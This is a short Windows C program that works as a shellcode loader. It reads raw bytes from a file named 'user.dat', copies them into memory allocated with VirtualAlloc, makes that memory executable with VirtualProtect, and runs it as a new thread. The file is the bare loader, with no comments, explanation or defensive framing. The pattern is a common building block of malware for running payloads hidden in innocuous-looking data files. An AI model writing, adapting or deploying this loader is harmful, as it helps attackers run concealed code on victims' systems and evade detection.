#include <Windows.h>
#include <stdio.h>

int main() {

	FILE* fp;
	SIZE_T size;
	unsigned char* buf;

	void* exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	fp = fopen("user.dat", "rb");
	fseek(fp, 0, SEEK_END);
	size = ftell(fp);
	fseek(fp, 0, SEEK_SET);
	buf = (unsigned char*)malloc(size);

	fread(buf, size, 1, fp);
	
	exec_mem = VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	RtlMoveMemory(exec_mem, buf, size);

	rv = VirtualProtect(exec_mem, size, PAGE_EXECUTE_READ, &oldprotect);

	if (rv != 0) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}
	return 0;
}
